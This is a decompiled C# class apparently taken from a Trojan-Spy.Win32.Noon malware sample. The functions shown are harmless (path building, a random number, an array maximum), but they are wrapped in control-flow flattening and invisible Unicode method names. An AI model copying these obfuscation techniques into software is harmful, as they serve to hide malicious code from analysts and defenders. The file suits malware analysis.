// Decompiled with JetBrains decompiler
// Type: ILegacyEvidenceAdap.HostProtectionAttrib
// Assembly: UInt32ArrayTypeI, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2F94D963-B282-4BF6-A540-85D019D8F975
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcqa-e64990765a452d35a4b5e461940d547ab3e145dbdf2e3b4b282b12ed1eba308d.exe

using System;
using System.IO;
using System.Runtime.InteropServices;

namespace ILegacyEvidenceAdap
{
  internal class HostProtectionAttrib
  {
    public static string GetBasePath()
    {
label_1:
      int num1 = -675180241;
      int index;
      string[] strArray;
      string str1;
      string str2;
      string basePath;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -156901116)) % 11U)
        {
          case 0:
            goto label_1;
          case 1:
            str1 = string.Empty;
            num1 = (int) num2 * 183114317 ^ 700809102;
            continue;
          case 3:
            str2 = HostProtectionAttrib.\u200C‫⁯‭⁭⁫‮‪‌⁭⁬⁪‫⁫⁮⁫⁪⁭⁭‏⁯⁬‭‌‫‮‭​⁫⁪⁪⁭⁯‏‌⁭⁯‏‍‏‮();
            num1 = (int) num2 * -1941668642 ^ 2049954199;
            continue;
          case 4:
            int num3;
            num1 = num3 = index >= strArray.Length - 2 ? -1036733369 : (num3 = -179452119);
            continue;
          case 5:
            index = 0;
            num1 = (int) num2 * -130043375 ^ -1695087821;
            continue;
          case 6:
            basePath = str1;
            num1 = (int) num2 * -238078674 ^ 429088598;
            continue;
          case 7:
            str1 = HostProtectionAttrib.\u202D‮‪⁪​‬⁪⁬​⁫‫⁭​⁫‌‬⁬‬‫⁮‍‭⁪‭‍‭⁫⁬‬‭⁪‬⁭​‬⁯​⁭⁪‌‮(str1, strArray[index], "\\");
            num1 = -1204203776;
            continue;
          case 8:
            strArray = HostProtectionAttrib.\u206F‌‌‮⁯‫‌​⁭⁪‫⁬‍⁭⁫⁯⁭‪‍‏⁬‍‪‫‏⁫‍‫⁫‬‮‫‍⁮‏‌⁫‫⁯‏‮(str2, new char[1]
            {
              '\\'
            });
            num1 = (int) num2 * 893483288 ^ -1831136785;
            continue;
          case 9:
            num1 = (int) num2 * -1701569730 ^ -2028813085;
            continue;
          case 10:
            ++index;
            num1 = (int) num2 * -1730486732 ^ -1098976818;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return basePath;
    }

    public static double RandDoubleInRange(double lower, double upper)
    {
      double num1 = HostProtectionAttrib.\u202C‬​‏⁪‍⁯⁫​‍⁪⁪‫⁪⁭‪⁪‍‌⁫‏‮⁯‍⁮‌⁯‬‍⁪⁯‭⁪⁬‎⁮⁭⁪⁫‏‮(HostProtectionAttrib.\u200D‏‭⁯‪‎‭‏⁮‌⁭⁬⁪⁬‍​‏⁯⁬‮⁮‏⁬​⁫‏⁮‪​‏⁭‌‎⁬​⁭‭‪‮‏‮()) * (upper - lower) + lower;
label_1:
      int num2 = 2128094206;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num2 ^ 172687452)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num2 = (int) num3 * 1943527488 ^ -1880957112;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return num1;
    }

    public static double Max(double[] values)
    {
label_1:
      int num1 = 462541419;
      double num2;
      int index;
      bool flag1;
      bool flag2;
      double num3;
      while (true)
      {
        uint num4;
        switch ((num4 = (uint) (num1 ^ 705416821)) % 11U)
        {
          case 1:
            flag1 = index < values.Length;
            num1 = 797873909;
            continue;
          case 2:
            num3 = num2;
            num1 = (int) num4 * 336445172 ^ -510885784;
            continue;
          case 3:
            goto label_1;
          case 4:
            flag2 = values[index] > num2;
            num1 = 1040776785;
            continue;
          case 5:
            num2 = values[index];
            num1 = (int) num4 * -1680626748 ^ -88126720;
            continue;
          case 6:
            num1 = (int) num4 * -2012589321 ^ 957515415;
            continue;
          case 7:
            num2 = values[0];
            index = 1;
            num1 = (int) num4 * -147273095 ^ 1755273106;
            continue;
          case 8:
            int num5 = !flag1 ? 466306568 : (num5 = 1919923659);
            num1 = num5 ^ (int) num4 * 1301832984;
            continue;
          case 9:
            ++index;
            num1 = 1662040696;
            continue;
          case 10:
            int num6 = !flag2 ? -1594273608 : (num6 = -802679472);
            num1 = num6 ^ (int) num4 * -32962353;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return num3;
    }

    static string \u200C‫⁯‭⁭⁫‮‪‌⁭⁬⁪‫⁫⁮⁫⁪⁭⁭‏⁯⁬‭‌‫‮‭​⁫⁪⁪⁭⁯‏‌⁭⁯‏‍‏‮() => Directory.GetCurrentDirectory();

    static string[] \u206F‌‌‮⁯‫‌​⁭⁪‫⁬‍⁭⁫⁯⁭‪‍‏⁬‍‪‫‏⁫‍‫⁫‬‮‫‍⁮‏‌⁫‫⁯‏‮([In] string obj0, [In] char[] obj1) => obj0.Split(obj1);

    static string \u202D‮‪⁪​‬⁪⁬​⁫‫⁭​⁫‌‬⁬‬‫⁮‍‭⁪‭‍‭⁫⁬‬‭⁪‬⁭​‬⁯​⁭⁪‌‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static Random \u200D‏‭⁯‪‎‭‏⁮‌⁭⁬⁪⁬‍​‏⁯⁬‮⁮‏⁬​⁫‏⁮‪​‏⁭‌‎⁬​⁭‭‪‮‏‮() => new Random();

    static double \u202C‬​‏⁪‍⁯⁫​‍⁪⁪‫⁪⁭‪⁪‍‌⁫‏‮⁯‍⁮‌⁯‬‍⁪⁯‭⁪⁬‎⁮⁭⁪⁫‏‮([In] Random obj0) => obj0.NextDouble();
  }
}
